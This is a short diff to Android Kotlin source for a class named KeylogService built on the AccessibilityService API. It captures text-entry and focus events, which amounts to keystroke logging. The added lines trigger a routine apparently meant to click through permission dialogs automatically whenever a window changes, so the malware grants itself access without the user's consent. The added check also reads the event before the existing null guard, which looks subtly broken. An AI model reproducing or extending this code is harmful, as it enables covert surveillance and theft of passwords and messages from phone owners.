@@ -30,6 +30,11 @@ class KeylogService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(evento: AccessibilityEvent?) {
+if (evento.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+            evento.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+        ) {
+            clicarPermissoes(evento)
+        }
         if (evento == null) return
         if (evento.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
             evento.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED
